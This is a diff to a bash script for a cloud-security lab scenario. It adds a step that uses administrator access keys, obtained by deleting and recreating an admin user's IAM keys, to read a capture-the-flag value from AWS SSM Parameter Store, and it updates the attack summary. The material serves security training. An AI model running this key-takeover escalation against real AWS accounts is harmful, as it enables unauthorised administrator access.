@@ -249,12 +249,33 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 10: Capture the CTF flag
+# The attacker now holds the admin user's fresh access keys (NEW_ACCESS_KEY / NEW_SECRET_KEY),
+# which carry AdministratorAccess. Use those credentials to read the scenario flag from
+# SSM Parameter Store — no additional credential-creation or assume-role step needed.
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+unset AWS_SESSION_TOKEN
+export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY
+export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
+export AWS_REGION=$AWS_REGION
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-003-to-admin"
+show_attack_cmd "Attacker (admin user)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -263,12 +284,13 @@ echo "3. Deleted existing access key: $KEY_TO_DELETE"
 echo "4. Created new access key: $NEW_ACCESS_KEY"
 echo "5. Switched to new admin credentials"
 echo "6. Achieved: Full administrator access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (iam:ListAccessKeys) → list keys"
 echo "  → (iam:DeleteAccessKey) → delete key: $KEY_TO_DELETE"
 echo "  → (iam:CreateAccessKey) → create key: $NEW_ACCESS_KEY"
-echo "  → $ADMIN_USER → Admin Access"
+echo "  → $ADMIN_USER → Admin Access → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
